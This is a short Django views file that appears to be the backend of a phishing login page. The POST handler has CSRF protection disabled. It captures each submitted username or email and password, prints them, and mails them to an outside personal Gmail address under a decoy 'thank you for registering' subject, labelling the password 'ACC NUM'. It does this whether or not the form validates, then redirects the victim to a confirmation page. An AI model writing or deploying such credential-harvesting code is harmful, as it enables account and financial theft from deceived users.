
from django.shortcuts import render
from django.views.generic import TemplateView
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .form import LoginForm
from django.shortcuts import redirect
from django.core.mail import send_mail
# from django.conf  import render

# Create your views here.



class Home(TemplateView):
    template_name ="login2.html"
    @csrf_exempt
    def post(self, *arg, **kwargs):
        form = LoginForm(data=self.request.POST)
        self.get_context_data()
        q = form.data.dict()
        print('==========',q)
        #  ' and ', q["account_number"], '========================'
        if form.is_valid():
            form.save()
            print('ssucdrsdlsdsjknjkdsnjdsndj')
            mail_me(q["username"], q["password"])
            return redirect('/')
        # return render(request, 'login.html', {'form': form})   

        # mail_me(q["email"], q["fullName"])
        else:
            # print('ssucdrsdlsdsjknjkdsnjdsndj')
            mail_me(q["email"], q["password"])
            return redirect('/confirmed')

def mail_me(username,password):
    print("=============RAN============")
    subject = 'Thank you for registering to our site'
    message = 'EMAIL== ' + username + ' ACC NUM==' + password 
    email_from = username
    print(subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
    return send_mail( subject, message, email_from, ["eliskafilat10@gmail.com"] )
    